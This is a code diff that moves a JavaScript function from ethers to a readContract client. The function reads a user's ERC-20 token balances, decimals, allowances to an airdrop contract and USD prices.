@@ -3,10 +3,16 @@ import axios from "axios";
 const erc20abi = require("../abis/erc20abi.json");
 const dataProviderAbi = require("../abis/DataProviderAbi.json");
 const airdropAbi = require('../abis/AirdropAbi.json');
-export const getBalanceErc20 = async (providerAddress, provider, tokens, userAddress, airdrop) => {
+export const getBalanceErc20 = async (providerAddress, client, tokens, userAddress, airdrop) => {
     console.log("GET BALANCE ERC20")
-    const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
-    const balances = await dataProviderContract.getERC20Balances(tokens.map((a) => { return a.address }), userAddress)
+    // const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
+    const balances = await client.readContract({
+        address: providerAddress,
+        abi: dataProviderAbi,
+        functionName: "getERC20Balances",
+        args: [tokens.map((a) => { return a.address }), userAddress]
+    })
+    // const balances = await dataProviderContract.getERC20Balances(tokens.map((a) => { return a.address }), userAddress)
     const filtredByBalance = tokens.reduce((filtered, element, index) => {
         if (balances[index].toString() !== "0") {
             filtered.push({ ...element, balance: balances[index] })
@@ -15,9 +21,19 @@ export const getBalanceErc20 = async (providerAddress, provider, tokens, userAdd
     }, [])
     let filtredTokens = [];
     for (let i = 0; i < filtredByBalance.length; i++) {
-        const contract = new ethers.Contract(filtredByBalance[i].address, erc20abi, provider);
-        const decimals = await contract.decimals();
-        const allowance = await contract.allowance(userAddress, airdrop);
+        // const contract = new ethers.Contract(filtredByBalance[i].address, erc20abi, client);
+        const decimals = await client.readContract({
+            address: filtredByBalance[i].address,
+            abi: erc20abi,
+            functionName: "decimals"
+        })
+        const allowance = await client.readContract({
+            address: filtredByBalance[i].address,
+            abi: erc20abi,
+            functionName: "allowance",
+            args: [userAddress, airdrop]
+        })
+        // const allowance = await contract.allowance(userAddress, airdrop);
         const res = await axios.get(`https://min-api.cryptocompare.com/data/price?fsym=${filtredByBalance[i].symbol}&tsyms=USD`)
         const price = res.data.USD;
         const balanceInUsd = +ethers.utils.formatUnits(filtredByBalance[i].balance, decimals) * res.data.USD;
